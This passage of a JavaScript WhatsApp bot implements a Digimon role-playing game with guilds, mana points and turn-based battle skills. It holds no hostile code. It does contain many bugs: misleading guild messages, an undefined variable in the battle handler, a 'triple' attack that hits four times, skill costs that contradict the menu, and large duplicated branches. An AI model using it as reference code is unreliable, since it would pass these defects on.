    "Blossomon", "Magnadramon", "Whamon", "Syakomon", "Pagumon", "Hagurumon", 
    "Kapurimon", "Solarmon", "Jazamon", "FanBeemon", "Spadamon", "Gladimon", 
    "Mammothmon", "Chibomon", "Sunmon", "Moonmon", "ModokiBetamon", "FanBeemon", 
    "Kudamon", "Falcomon", "Crabmon", "ShogunGekomon", "Tapirmon", "Mojyamon", 
    "ClearAgumon", "Goblimon", "Monmon", "Kokuwamon", "Gotsumon", "Lynxmon", 
    "Soulmon", "Poromon", "Bokomon", "Kunemon", "Kamemon", "Swimmon", "Aruraumon", 
    "Pillomon", "Ankylomon", "Stegomon", "ShellNumemon", "Deramon", "SableLeeomon", 
    "Lykamon", "Pinochimon", "SandYanmamon", "Junkmon", "Zudomon", "Rockmon", 
    "ShadowToyAgumon", "KingWhamon", "Bakomon", "Swanmon", "Devidramon", 
    "Cerberumon", "Deltamon"
];

 

let userDigimons = {};
let guilds = {};
let userGuilds = {};


const guildsPath = './Rpg/Guilds.json';
const userGuildsPath = './Rpg/UserGuilds.json';

// Load data from JSON file
const loadData = (path, defaultValue) => {
    if (fs.existsSync(path)) {
        try {
            return JSON.parse(fs.readFileSync(path, 'utf-8'));
        } catch (err) {
            console.error('Error reading JSON file:', err);
            return defaultValue;
        }
    }
    return defaultValue;
};

userDigimons = loadData(path, {});
guilds = loadData(guildsPath, {});
userGuilds = loadData(userGuildsPath, {});

// Save data to JSON file
const saveData = (path, data) => {
    try {
        fs.writeFileSync(path, JSON.stringify(data, null, 2));
        console.log('Data saved successfully');
    } catch (err) {
        console.error('Error saving data:', err);
    }
};

    const LINODE_API_TOKEN = global.apilinode;
    const API_TOKEN = global.apitokendo;
    
    
    
    
    
    
    
   
   
   
    
    
const pathh = './Rpg/guilds.json';
const userPath = './Rpg/userss.json';

// Load guilds data & sv

if (fs.existsSync(pathh)) {
    guilds = JSON.parse(fs.readFileSync(pathh, 'utf-8'));
}


let users = {};
if (fs.existsSync(userPath)) {
    users = JSON.parse(fs.readFileSync(userPath, 'utf-8'));
    for (let userId in users) {
        if (!users[userId].mp) {
            users[userId].mp = 0;
        }
    }
}

const saveGuilds = () => {
    fs.writeFileSync(pathh, JSON.stringify(guilds, null, 2));
};


const saveUsers = () => {
    fs.writeFileSync(userPath, JSON.stringify(users, null, 2));
};

    //======// Mana point & more stats 
    const addMP = (amount) => {


    userdb.mp = Math.min(userdb.mp + amount, userdb.mpmax);
    return `MP ${m.sender.replace("@s.whatsapp.net", "")} bertambah ${amount}. Total MP sekarang: ${userdb.mp}`
};

    
const reduceMP = (amount) => {
if (userdb.mp < 1) return m.reply("*`[ NO MORE MP ]`* -> cannot used skils.")

    
   userdb.mp = Math.max(userdb.mp - amount, 0);
    return `MP ${m.sender.replace("@s.whatsapp.net", "")} berkurang ${amount}. Total MP sekarang: ${userdb.mp}`
};
    
    //=======//
    
    
    // guild
const createGuild = (guildName, creatorId) => {
    if (guilds[guildName]) {
        return reply(`A guild with the name ${guildName} already exists.`);
    }

    if (users[creatorId] && users[creatorId].guild) {
        return reply(`Anda sudah menjadi anggota guild: ${users[creatorId].guild}`);
    }

    guilds[guildName] = { leader: creatorId, members: [] };
    users[creatorId] = { guild: guildName, role: 'leader' };

    saveGuilds();
    saveUsers();

    return reply(`Guild ${guildName} berhasil dibuat!`);
};

    const listGuilds = () => {
    const guildNames = Object.keys(guilds);
    if (guildNames.length === 0) {
        return reply("No guilds available .");
    }
    return reply(`List of available guilds:\n- ${guildNames.join('\n- ')}`);
};
    
const getGuildInfo = (guildName) => {
    const guild = guilds[guildName];
    if (!guild) {
        return reply(`A guild with the name${guildName} already existed.`);
    }

    const leader = guild.leader;
    const members = guild.members;

    let info = `*${m2}< G U I L D - I N F O >${m2}* 

*Name: ${guildName}*\nLeader: ${leader}\n\nMembers:\n`;
    members.forEach((member, index) => {
        info += `\n${index + 1}. ${member}`;
    });

    return reply(info);
};

    
const joinGuild = (guildName, userId) => {
    const guild = guilds[guildName];
    if (!guild) {
        return reply(`A guild with the name ${guildName} already existed.`);
    }

    if (users[userId] && users[userId].guild) {
        return reply(`You are already a member of the guild: ${users[userId].guild}`);
    }

    guild.members.push(userId);
    users[userId] = { guild: guildName, role: 'member' };

    saveGuilds();
    saveUsers();

    return reply(`You are already a member of the guild ${guildName}!`);
};

const deleteGuild = (guildName, userId) => {
    const guild = guilds[guildName];
    if (!guild) {
        return reply(`A guild with the name ${guildName} already existed.`);
    }

    if (guild.leader !== userId) {
        return reply(`You do not have permission to delete this guild.`);
    }

    guild.members.forEach(member => {
        delete users[member];
    });

    delete users[guild.leader];
    delete guilds[guildName];

    saveGuilds();
    saveUsers();

    return reply(`Guild ${guildName} deleted successfully!`);
};

    const leaveGuild = (userId) => {
    const userx = users[userId];
    if (!userx || !userx.guild) {
        return reply(`You are already a member of the guild.`);
    }

    const guildName = userx.guild;
    const guild = guilds[guildName];

    if (userx.role === 'leader') {
        return reply(`As the leader, you cannot leave the guild. You have to delete the guild..`);
    }

    guild.members = guild.members.filter(member => member !== userId);
    delete users[userId];

    saveGuilds();
    saveUsers();

    return reply(`you have left the guild ${guildName}.`);
};

   
    
const getRandomDigimon = () => {
    const availableDigimons = digimons.filter(digimon => {
        return !Object.values(userDigimons).includes(digimon);
    });
    return availableDigimons.length > 0 ? availableDigimons[Math.floor(Math.random() * availableDigimons.length)] : null;
};
   //=======//
   
 
const BATTLES_FILE = './Rpg/battles.json';

const loadBattlesData = () => {
    if (fs.existsSync(BATTLES_FILE)) {
        const data = fs.readFileSync(BATTLES_FILE);
        return JSON.parse(data);
    } else {
        return {
            battleRequests: {},
            ongoingBattles: {}
        };
    }
};

const saveBattlesData = (data) => {
    fs.writeFileSync(BATTLES_FILE, JSON.stringify(data, null, 2));
};

const { battleRequests, ongoingBattles } = loadBattlesData();

const challengeBattle = (challengerId, challengedId) => {
    console.log('challengerId:', challengerId);
    console.log('challengedId:', challengedId);
    
    userdb.attacksi = challengedId
    userdb.isBattle = true;
    userdb.breakk = false
    if (battleRequests[challengedId]) {
        return reply('The user already has a pending challenge request.');
    }

    battleRequests[challengedId] = challengerId;
    ongoingBattles[challengerId] = { challengedId, status: 'pending' };

    saveBattlesData({ battleRequests, ongoingBattles });

    setTimeout(() => {
        ptz.sendMessage(challengedId, { text: `*Battle Req*\n\n*Acc / Decline*\nDigimon: *${userDigimons[challengerId]}*\n> .acc-battle ${challengerId.replace("@s.whatsapp.net", "")}<-> .reject-battle` });
    }, 1300);

    return reply(`Tantangan telah dikirim ke ${challengedId}. Menunggu persetujuan.\n- *Cancel Battle : .cancel-battle*`);
};

const skillsList = `
\n\n*${m2}[ SKILLS LIST ]${m2}*\n\nTech : .tech  
- *< 18 MP >*
> Super Attack

Attk : .attack 
* *< 0 MP >*
> Basic Attack

Heal : .heald
- *< 23 MP >*
> Heal HP 400+

Focus : .focus
- *< 36 MP >*
> ATK charge - 19+

Card Slash : .slash
- *< 20 MP >*
> Random Card Slash

Break Attack : .break 
- *< 43 MP >*
> Break - more time for attack

*${m2}< LETS GO PARTNER ! >${m2}*
`;


const startBattle = (challengedId, challengerId) => {
    
    ptz.sendMessage(challengerId, { text: `Battle started! Your turn to attack ${userDigimons[challengedId]}.${skillsList}` });
    setTimeout(() => {
        ptz.sendMessage(challengedId, { text: `Battle started! Your turn to attack ${userDigimons[challengerId]}.${skillsList}` });
    }, 1200); // Using setTimeout instead of sleep
};

const acceptBattle = (challengedId, challengerId) => {
    userdb.attacksi = challengedId
    userdb.isBattle = true;
    userdb.breakk = false

   // if (!ongoingBattles[challengerId]) {
        console.log('Battle Requests:', battleRequests);
        console.log('Ongoing Battles:', ongoingBattles);
       /* return reply('Tidak ada tantangan yang tertunda.');
   }*/

    ongoingBattles[challengedId].status = 'accepted';
    delete battleRequests[challengedId];

    saveBattlesData({ battleRequests, ongoingBattles });

    reply(`Challenge accepted. The fight begins between ${m.sender.replace('@s.whatsapp.net', '')} dan ${challengedId.replace('@s.whatsapp.net', '')}!`);
    setTimeout(() => {
    return startBattle(challengedId, challengerId);
    }, 1000)
};

const cancelBattle = (challengerId) => {
    const battle = ongoingBattles[challengerId];
    
    if (!battle) {
        return reply('Tidak ada tantangan yang tertunda.');
    }

    const challengedId = battle.challengedId;
    delete ongoingBattles[challengerId];
    delete battleRequests[challengedId];

    userdb.isBattle = false;

    saveBattlesData({ battleRequests, ongoingBattles });

    return reply('Tantangan activated.');
};
//========// function battle, jangan di oprek bakal error lalu salahin saya

let responkalahn = `
*< [ L O S E ] >* 

_You lose and gain leveling_
> Battle Ends - lost ×
`

let responmenangn = `
*< [ W I N N E R ] >* 

_You win and get leveling and rewards_
> Battle Berakhir - menang •
`

//========//

const attack = async (typenyahb, m, userId, plusn = 0) => {
if (userdb.isBattle === false) return m.reply("*`[ DENIED ]`* You Not in match, try battle with friends.")

const isdarahnol = getDarah(userId)

if (isdarahnol === 0) {
ptz.sendMessage(m.sender, {text:responmenangn})
setTimeout(() => {
ptz.sendMessage(userId, {text:responkalahn})
addXP(m.sender, 79)
userdb.bits += 100
userdb.isBattle = false
    if (!ongoingBattles[challengerId]) {
        return reply('Tidak ada tantangan yang tertunda.');
    }

    const challengedId = ongoingBattles[challengerId].challengedId;
    delete ongoingBattles[challengerId];
    delete battleRequests[challengedId];

    saveBattlesData({ battleRequests, ongoingBattles });
return;
}, 1000)
} else {
}
console.log("Log Kalah / Menang")

    let resleebh = '*`[ COLDOWN ]`* Cannot Used Skils, Please Wait...';
    
    if (userdb.breakk === false) {
       if (new Date() - userdb.kuldonattack < 9000) {
      m?.reply(resleebh);
      return;
    }
    userdb.kuldonattack = new Date();        
    
    
    console.log("Respone bagus")
    
    
let cooldownn = 9000; 
    userdb.kuldonattack = new Date() * 1 + cooldownn;
} else if (userdb.breakk === true) {
       if (new Date() - userdb.attacknocul < 7000) {
       
       if (typenyahb === "Tech") {
            const atkfusb = userdb.attackdigi += 30;
              
            ptz.sendMessage(m.sender, {
                text: `*${m2}[ ( ${userDigimons[m.sender]} ) -> ATTACK ]${m2}*

*-_ Parameter Info _-*

_Digi: ${userDigimons[m.sender]}_
_Use Type: .tech_
_Result: ${atkfusb} attk_
_Coldown: 9 Sec_
_You MP:_ ${userdb.mp}`
            });

            setTimeout(() => {
                ptz.sendMessage(userId, {
                    text: `*${m2}[ ( ${userDigimons[m.sender]} ) -> ATTACK ]${m2}*

*-_ Parameter Info _-*

_Digi: ${userDigimons[m.sender]}_
_Use Type: .tech_
_Result: ${atkfusb} attk_
_Coldown: 9 Sec_

*${m2}[ ( ${userDigimons[userId]} ) <- ATTACKED ]${m2}*

*-_ Your Parameter Info _-*

_Digi: ${userDigimons[userId]}_
_Healt: ${getDarah(userId)}_`
                });
            }, 1800);
            reduceMP(23);
            kurangDarah(userId, atkfusb);
            userdb.attackdigi -= 30;



if (isdarahnol === 0) {
ptz.sendMessage(m.sender, {text:responmenangn})
setTimeout(() => {
ptz.sendMessage(userId, {text:responkalahn})
return;
}, 1000)
}
console.log("Log Kalah / Menang")

        } else if (typenyahb === "Attk") {
            const atkfusb = userdb.attackdigi;
              kurangDarah(userId, atkfusb);
            ptz.sendMessage(m.sender, {
                text: `*${m2}[ ( ${userDigimons[m.sender]} ) -> ATTACK ]${m2}*

*-_ Parameter Info _-*

_Digi: ${userDigimons[m.sender]}_
_Use Type: .attack_
_Result: ${atkfusb} attk_
_Coldown: 9 Sec_
_You MP:_ ${userdb.mp}`
            });

            setTimeout(() => {
                ptz.sendMessage(userId, {
                    text: `*${m2}[ ( ${userDigimons[m.sender]} ) -> ATTACK ]${m2}*

*-_ Parameter Info _-*

_Digi: ${userDigimons[m.sender]}_
_Use Type: .tech_
_Result: ${atkfusb} attk_
_Coldown: 9 Sec_

*${m2}[ ( ${userDigimons[userId]} ) <- ATTACKED ]${m2}*
*-_ Your Parameter Info _-*

_Digi: ${userDigimons[userId]}_
_Healt: ${getDarah(userId)}_`
                });
            }, 1200);
            
            

if (isdarahnol === 0) {
ptz.sendMessage(m.sender, {text:responmenangn})
setTimeout(() => {
ptz.sendMessage(userId, {text:responkalahn})
return;
}, 1000)
}
console.log("Log Kalah / Menang")
        } else if (typenyahb === "Heal") {
            addDarah(m.sender, 400, userdb.maxdarahdigi);
            reduceMP(31);
            ptz.sendMessage(userId, {
                text: `*${m2}[ ( ${userDigimons[m.sender]} ) -> HEAL ]${m2}*

*-_ Parameter Info _-*

_Digi: ${userDigimons[m.sender]}_
_Use Type: .heald_
_Result: 400+ Hp_
_Healt Point: ${getDarah(userId)}
_Coldown: 9 Sec_`
            });

            setTimeout(() => {
                ptz.sendMessage(userId, {
                    text: `*${m2}[ ( ${userDigimons[m.sender]} ) -> HEAL ]${m2}*

*-_ Parameter Info _-*

_Digi: ${userDigimons[m.sender]}_
_Use Type: .heald_
_Result: 400 Hp_
_Coldown: 9 Sec_`
                });
            }, 1200);
        } else if (typenyahb === "Focus") {
            const atkfusb = userdb.attackdigi += 56;

            ptz.sendMessage(m.sender, {
                text: `*${m2}[ ( ${userDigimons[m.sender]} ) -> ATTACK ]${m2}*

*-_ Parameter Info _-*

_Digi: ${userDigimons[m.sender]}_
_Use Type: .pcus_
_Result: ${atkfusb} attk_
_Coldown: 9 Sec_
_You MP:_ ${userdb.mp}

> ${m2}OVER POWER FOCUS ATTACK${m2}`
            });

            setTimeout(() => {
                ptz.sendMessage(userId, {
                    text: `*${m2}[ ( ${userDigimons[m.sender]} ) -> ATTACK ]${m2}*

*-_ Parameter Info _-*

_Digi: ${userDigimons[m.sender]}_
_Use Type: .pcus_
_Result: ${atkfusb} attk_
_Coldown: 9 Sec_

> ${m2}OVER POWER FOCUS ATTACK${m2}

*${m2}[ ( ${userDigimons[userId]} ) <- ATTACKED ]${m2}*

*-_ Your Parameter Info _-*

_Digi: ${userDigimons[userId]}_
_Healt: ${getDarah(userId)}_`
                });
            }, 1800);
            reduceMP(36);
            kurangDarah(userId, atkfusb);
            userdb.attackdigi -= 56;
            

if (isdarahnol === 0) {
ptz.sendMessage(m.sender, {text:responmenangn})
setTimeout(() => {
ptz.sendMessage(userId, {text:responkalahn})
return;
}, 1000)
}
console.log("Log Kalah / Menang")

        } else if (typenyahb === "Card") {
           reduceMP(36);
            const ishasilvahj = pickRandom(["Attack Boost", "back counter", "triple"]);
            if (ishasilvahj === "Attack Boost") {
                kurangDarah(userId, 61);
                ptz.sendMessage(m.sender, { text: "*`[ CARD SLASH ]`* -> Attack Boost !\n> <!> Succesfuly Attack" });

                setTimeout(() => {
                    ptz.sendMessage(userId, {
                        text: `*${m2}[ ( ${userDigimons[m.sender]} ) -> CARD - ATTACK ]${m2}*

*-_ Parameter Info _-*

_Digi: ${userDigimons[m.sender]}_
_Use Type: .slash_
_Result: 61 attk_
_Coldown: 9 Sec_

> ${m2}<!> CARD SLASH <!>${m2}

*${m2}[ ( ${userDigimons[userId]} ) <- ATTACKED ]${m2}*

*-_ Your Parameter Info _-*

_Digi: ${userDigimons[userId]}_
_Healt: ${getDarah(userId)}_`
                    });
                }, 1200);
                

if (isdarahnol === 0) {
ptz.sendMessage(m.sender, {text:responmenangn})
setTimeout(() => {
ptz.sendMessage(userId, {text:responkalahn})
return;
}, 1000)
}
console.log("Log Kalah / Menang")
            } else if (ishasilvahj === "back counter") {
                kurangDarah(userId, 39);
                ptz.sendMessage(m.sender, { text: "*`[ CARD SLASH ]`* -> Back Counter\n> <!> Succesfuly Attack" });

                setTimeout(() => {
                    ptz.sendMessage(userId, {
                        text: `*${m2}[ ( ${userDigimons[m.sender]} ) -> CARD - ATTACK ]${m2}*

*-_ Parameter Info _-*

_Digi: ${userDigimons[m.sender]}_
_Use Type: .slash_
_Result: 39 attk_
_Coldown: 9 Sec_

> ${m2}<!> CARD SLASH <!>${m2}

*${m2}[ ( ${userDigimons[userId]} ) <- ATTACKED ]${m2}*

*-_ Your Parameter Info _-*

_Digi: ${userDigimons[userId]}_
_Healt: ${getDarah(userId)}_`
                    });
                }, 1200);
                

if (isdarahnol === 0) {
ptz.sendMessage(m.sender, {text:responmenangn})
setTimeout(() => {
ptz.sendMessage(userId, {text:responkalahn})
return;
}, 1000)
}
console.log("Log Kalah / Menang")
            } else if (ishasilvahj === "triple") {
                kurangDarah(userId, 21);
                kurangDarah(userId, 21);
                kurangDarah(userId, 21);
                kurangDarah(userId, 21);
                ptz.sendMessage(m.sender, { text: "*`[ CARD SLASH ]`* -> 3x Attack MORE !\n> <!> Succesfuly Attack" });

                setTimeout(() => {
                    ptz.sendMessage(userId, {
                        text: `*${m2}[ ( ${userDigimons[m.sender]} ) -> CARD - ATTACK ]${m2}*

*-_ Parameter Info _-*

_Digi: ${userDigimons[m.sender]}_
_Use Type: .slash_
_Result: 84 attk_
_Coldown: 9 Sec_

> ${m2}<!> CARD SLASH <!>${m2}

*${m2}[ ( ${userDigimons[userId]} ) <- ATTACKED ]${m2}*

*-_ Your Parameter Info _-*

_Digi: ${userDigimons[userId]}_
_Healt: ${getDarah(userId)}_`
                    });
                }, 1200);
                

if (isdarahnol === 0) {
ptz.sendMessage(m.sender, {text:responmenangn})
setTimeout(() => {
ptz.sendMessage(userId, {text:responkalahn})
return;
}, 1000)
}
console.log("Log Kalah / Menang")
            }
        } else if (typenyahb === "Break") {
        reduceMP(41);
        console.log("*************")
        const isMissbreak = await pickRandom(["MISS","ATTK"])
        
        if (isMissbreak === "ATTK") {
            kurangDarah(userId, userdb.attackdigi);
            
            ptz.sendMessage(m.sender, { text: "*`[ BREAK INFINITY ]`* -> Attack Boost\n> <!> Succesfuly Attack" });

            setTimeout(() => {
                ptz.sendMessage(userId, {
                    text: `*${m2}[ ( ${userDigimons[m.sender]} ) -> BREAK INFINITY - ATTACK ]${m2}*

*-_ Parameter Info _-*

_Digi: ${userDigimons[m.sender]}_
_Use Type: .break_
_Result: ${userdb.attackdigi} attk & more 7 Sec No coldown_
_Coldown: -_

> ${m2}<!> BREAK INFINITY <!>${m2}

*${m2}[ ( ${userDigimons[userId]} ) <- ATTACKED ]${m2}*

*-_ Your Parameter Info _-*

_Digi: ${userDigimons[userId]}_
_Healt: ${getDarah(userId)}_`
                });
                
                userdb.breakk = true
                userdb.kuldonattack = new Date();    
let cooldownn = 9000; 
    userdb.attacknocul = new Date() * 1 + cooldownn;

if (isdarahnol === 0) {
ptz.sendMessage(m.sender, {text:responmenangn})
setTimeout(() => {
ptz.sendMessage(userId, {text:responkalahn})
return;
}, 1000)
}
console.log("Log Kalah / Menang")

            }, 1800);
            } else if (isMissbreak === "MISS") {
                        ptz.sendMessage(userId, {
                    text: `*${m2}[ ( ${userDigimons[m.sender]} ) -> BREAK INFINITY SLASH - ATTACK ]${m2}*

*-_ Parameter Info _-*

_Digi: ${userDigimons[m.sender]}_
_Use Type: .break_
_Result: 0 attk & 0 more sec Attk_
_Coldown: 9 Sec_

${m2}<!> MISS ATTACK <!>${m2}`
                });
                
            setTimeout(() => {
                ptz.sendMessage(userId, {
                    text: `*${m2}[ ( ${userDigimons[m.sender]} ) -> BREAK INFINITY SLASH - ATTACK ]${m2}*

*-_ Parameter Info _-*

_Digi: ${userDigimons[m.sender]}_
_Use Type: .break_
_Result: 0 attk & 0 more sec Attk_
_Coldown: 9 Sec_

${m2}<!> MISS ATTACK <!>${m2}`
                });
            }, 1200)
            }
       return;
       }
       
    userdb.breakk = false
    m.reply("Break Attack Effect - 0, return to normal")
    return
}} //====//
sleep(1000)

        if (typenyahb === "Tech") {
            const atkfusb = userdb.attackdigi += 30;
              
            ptz.sendMessage(m.sender, {
                text: `*${m2}[ ( ${userDigimons[m.sender]} ) -> ATTACK ]${m2}*

*-_ Parameter Info _-*

_Digi: ${userDigimons[m.sender]}_
_Use Type: .tech_
_Result: ${atkfusb} attk_
_Coldown: 9 Sec_
_You MP:_ ${userdb.mp}`
            });

            setTimeout(() => {
                ptz.sendMessage(userId, {
                    text: `*${m2}[ ( ${userDigimons[m.sender]} ) -> ATTACK ]${m2}*

*-_ Parameter Info _-*

_Digi: ${userDigimons[m.sender]}_
_Use Type: .tech_
_Result: ${atkfusb} attk_
_Coldown: 9 Sec_

*${m2}[ ( ${userDigimons[userId]} ) <- ATTACKED ]${m2}*

*-_ Your Parameter Info _-*

_Digi: ${userDigimons[userId]}_
_Healt: ${getDarah(userId)}_`
                });
            }, 1800);
            reduceMP(23);
            kurangDarah(userId, atkfusb);
            userdb.attackdigi -= 30;


if (isdarahnol === 0) {
ptz.sendMessage(m.sender, {text:responmenangn})
setTimeout(() => {
ptz.sendMessage(userId, {text:responkalahn})
return;
}, 1000)
}
console.log("Log Kalah / Menang")

        } else if (typenyahb === "Attk") {
            const atkfusb = userdb.attackdigi;
              kurangDarah(userId, atkfusb);
            ptz.sendMessage(m.sender, {
                text: `*${m2}[ ( ${userDigimons[m.sender]} ) -> ATTACK ]${m2}*

*-_ Parameter Info _-*

_Digi: ${userDigimons[m.sender]}_
_Use Type: .attack_
_Result: ${atkfusb} attk_
_Coldown: 9 Sec_
_You MP:_ ${userdb.mp}`
            });

            setTimeout(() => {
                ptz.sendMessage(userId, {
                    text: `*${m2}[ ( ${userDigimons[m.sender]} ) -> ATTACK ]${m2}*

*-_ Parameter Info _-*

_Digi: ${userDigimons[m.sender]}_
_Use Type: .tech_
_Result: ${atkfusb} attk_
_Coldown: 9 Sec_

*${m2}[ ( ${userDigimons[userId]} ) <- ATTACKED ]${m2}*
*-_ Your Parameter Info _-*

_Digi: ${userDigimons[userId]}_
_Healt: ${getDarah(userId)}_`
                });
            }, 1200);
            

if (isdarahnol === 0) {
ptz.sendMessage(m.sender, {text:responmenangn})
setTimeout(() => {
ptz.sendMessage(userId, {text:responkalahn})
return;
}, 1000)
}
console.log("Log Kalah / Menang")

        } else if (typenyahb === "Heal") {
            addDarah(m.sender, 400, userdb.maxdarahdigi);
            reduceMP(31);
            ptz.sendMessage(userId, {
                text: `*${m2}[ ( ${userDigimons[m.sender]} ) -> HEAL ]${m2}*

*-_ Parameter Info _-*

_Digi: ${userDigimons[m.sender]}_
_Use Type: .heald_
_Result: 400+ Hp_
_Healt Point: ${getDarah(userId)}
_Coldown: 9 Sec_`
            });

            setTimeout(() => {
                ptz.sendMessage(userId, {
                    text: `*${m2}[ ( ${userDigimons[m.sender]} ) -> HEAL ]${m2}*

*-_ Parameter Info _-*

_Digi: ${userDigimons[m.sender]}_
_Use Type: .heald_
_Result: 400 Hp_
_Coldown: 9 Sec_`
                });
            }, 1200);
        } else if (typenyahb === "Focus") {
            const atkfusb = userdb.attackdigi += 56;

            ptz.sendMessage(m.sender, {
                text: `*${m2}[ ( ${userDigimons[m.sender]} ) -> ATTACK ]${m2}*

*-_ Parameter Info _-*

_Digi: ${userDigimons[m.sender]}_
_Use Type: .pcus_
_Result: ${atkfusb} attk_
_Coldown: 9 Sec_
_You MP:_ ${userdb.mp}

> ${m2}OVER POWER FOCUS ATTACK${m2}`
            });

            setTimeout(() => {
                ptz.sendMessage(userId, {
                    text: `*${m2}[ ( ${userDigimons[m.sender]} ) -> ATTACK ]${m2}*

*-_ Parameter Info _-*

_Digi: ${userDigimons[m.sender]}_
_Use Type: .pcus_
_Result: ${atkfusb} attk_
_Coldown: 9 Sec_

> ${m2}OVER POWER FOCUS ATTACK${m2}

*${m2}[ ( ${userDigimons[userId]} ) <- ATTACKED ]${m2}*

*-_ Your Parameter Info _-*

_Digi: ${userDigimons[userId]}_
_Healt: ${getDarah(userId)}_`
                });
            }, 1800);
            reduceMP(36);
            kurangDarah(userId, atkfusb);
            userdb.attackdigi -= 56;
            

if (isdarahnol === 0) {
ptz.sendMessage(m.sender, {text:responmenangn})
setTimeout(() => {
ptz.sendMessage(userId, {text:responkalahn})
return;
}, 1000)
}
console.log("Log Kalah / Menang")

        } else if (typenyahb === "Card") {
           reduceMP(36);
            const ishasilvahj = pickRandom(["Attack Boost", "back counter", "triple"]);
            if (ishasilvahj === "Attack Boost") {
                kurangDarah(userId, 61);
                ptz.sendMessage(m.sender, { text: "*`[ CARD SLASH ]`* -> Attack Boost !\n> <!> Succesfuly Attack" });

                setTimeout(() => {
                    ptz.sendMessage(userId, {
                        text: `*${m2}[ ( ${userDigimons[m.sender]} ) -> CARD - ATTACK ]${m2}*

*-_ Parameter Info _-*

_Digi: ${userDigimons[m.sender]}_
_Use Type: .slash_
_Result: 61 attk_
_Coldown: 9 Sec_

> ${m2}<!> CARD SLASH <!>${m2}

*${m2}[ ( ${userDigimons[userId]} ) <- ATTACKED ]${m2}*

*-_ Your Parameter Info _-*

_Digi: ${userDigimons[userId]}_
_Healt: ${getDarah(userId)}_`
                    });
                }, 1200);
                

if (isdarahnol === 0) {
ptz.sendMessage(m.sender, {text:responmenangn})
setTimeout(() => {
ptz.sendMessage(userId, {text:responkalahn})
return;
}, 1000)
}
console.log("Log Kalah / Menang")

            } else if (ishasilvahj === "back counter") {
                kurangDarah(userId, 39);
                ptz.sendMessage(m.sender, { text: "*`[ CARD SLASH ]`* -> Back Counter\n> <!> Succesfuly Attack" });

                setTimeout(() => {
                    ptz.sendMessage(userId, {
                        text: `*${m2}[ ( ${userDigimons[m.sender]} ) -> CARD - ATTACK ]${m2}*

*-_ Parameter Info _-*

_Digi: ${userDigimons[m.sender]}_
_Use Type: .slash_
_Result: 39 attk_
_Coldown: 9 Sec_

> ${m2}<!> CARD SLASH <!>${m2}

*${m2}[ ( ${userDigimons[userId]} ) <- ATTACKED ]${m2}*

*-_ Your Parameter Info _-*

_Digi: ${userDigimons[userId]}_
_Healt: ${getDarah(userId)}_`
                    });
                }, 1200);
                
if (isdarahnol === 0) {
ptz.sendMessage(m.sender, {text:responmenangn})
setTimeout(() => {
ptz.sendMessage(userId, {text:responkalahn})
return;
}, 1000)
}
console.log("Log Kalah / Menang")

            } else if (ishasilvahj === "triple") {
                kurangDarah(userId, 21);
                kurangDarah(userId, 21);
                kurangDarah(userId, 21);
                kurangDarah(userId, 21);
                ptz.sendMessage(m.sender, { text: "*`[ CARD SLASH ]`* -> 3x Attack MORE !\n> <!> Succesfuly Attack" });

                setTimeout(() => {
                    ptz.sendMessage(userId, {
                        text: `*${m2}[ ( ${userDigimons[m.sender]} ) -> CARD - ATTACK ]${m2}*

*-_ Parameter Info _-*

_Digi: ${userDigimons[m.sender]}_
_Use Type: .slash_
_Result: 84 attk_
_Coldown: 9 Sec_

> ${m2}<!> CARD SLASH <!>${m2}

*${m2}[ ( ${userDigimons[userId]} ) <- ATTACKED ]${m2}*

*-_ Your Parameter Info _-*

_Digi: ${userDigimons[userId]}_
_Healt: ${getDarah(userId)}_`
                    });
                }, 1200);
                

if (isdarahnol === 0) {
ptz.sendMessage(m.sender, {text:responmenangn})
setTimeout(() => {
ptz.sendMessage(userId, {text:responkalahn})
return;
}, 1000)
}
console.log("Log Kalah / Menang")

            }
        } else if (typenyahb === "Break") {
        
        reduceMP(41);
        const isMissbreak = await pickRandom(["MISS","ATTK"])
        
        if (isMissbreak === "ATTK") {
            kurangDarah(userId, userdb.attackdigi);
            
            ptz.sendMessage(m.sender, { text: "*`[ BREAK INFINITY ]`* -> Attack Boost\n> <!> Succesfuly Attack" });

            setTimeout(() => {
                ptz.sendMessage(userId, {
                    text: `*${m2}[ ( ${userDigimons[m.sender]} ) -> BREAK INFINITY - ATTACK ]${m2}*

*-_ Parameter Info _-*

_Digi: ${userDigimons[m.sender]}_
_Use Type: .break_
_Result: ${userdb.attackdigi} attk & more 14 Sec No coldown_
_Coldown: -_

> ${m2}<!> BREAK INFINITY <!>${m2}

*${m2}[ ( ${userDigimons[userId]} ) <- ATTACKED ]${m2}*

*-_ Your Parameter Info _-*

_Digi: ${userDigimons[userId]}_
_Healt: ${getDarah(userId)}_`
                });
                
                userdb.breakk = true
            }, 1800);
            
if (isdarahnol === 0) {
ptz.sendMessage(m.sender, {text:responmenangn})
setTimeout(() => {
ptz.sendMessage(userId, {text:responkalahn})
return;
}, 1000)
}
console.log("Log Kalah / Menang")
    
userdb.kuldonattack = new Date();    
let cooldownn = 9000; 
    userdb.attacknocul = new Date() * 1 + cooldownn;
return;
            } else if (isMissbreak === "MISS") {
                        ptz.sendMessage(userId, {
                    text: `*${m2}[ ( ${userDigimons[m.sender]} ) -> BREAK INFINITY SLASH - ATTACK ]${m2}*

*-_ Parameter Info _-*

_Digi: ${userDigimons[m.sender]}_
_Use Type: .break_
_Result: 0 attk & 0 more sec Attk_
_Coldown: 9 Sec_

${m2}<!> MISS ATTACK <!>${m2}`
                });
                
            setTimeout(() => {
                ptz.sendMessage(userId, {
                    text: `*${m2}[ ( ${userDigimons[m.sender]} ) -> BREAK INFINITY SLASH - ATTACK ]${m2}*

*-_ Parameter Info _-*

_Digi: ${userDigimons[m.sender]}_
_Use Type: .break_
_Result: 0 attk & 0 more sec Attk_
_Coldown: 9 Sec_

${m2}<!> MISS ATTACK <!>${m2}`
                });
            }, 1200)
    }
   }}






const digimon = getRandomDigimon();

const addDarahOrang = (userId, amount) => {
 

    userdb.DarahOrang = Math.min(userdb.DarahOrang + amount, 300);
   
    return `HP ${userId} bertambah ${amount}. Total HP sekarang: ${userdb.DarahOrang}`
};

    const spinDigimon = (userId, m) => {
    if (userDigimons[userId]) {
        return m.reply(`[ ${global.botname} ] You already have a Digimon: ${userDigimons[userId]}`);
    }

    
    if (!digimon) {
        return m.reply(`[ ${global.botname} ] Ouh no, There No more Digimon For You.`)
    }
m.reply (`[ ${global.botname} ] I'm Select Digimon For you, Please wait..`)
    userDigimons[userId] = digimon;
    saveData(path, userDigimons);
    setTimeout(async () => {
    reply(`Congratulations! You got a ${digimon}`);
    userdb.attackdigi = 53
    userdb.maxdarahdigi = 230
    userdb.digivice = true
    userdb.tp = 5
    userdb.bits = 15
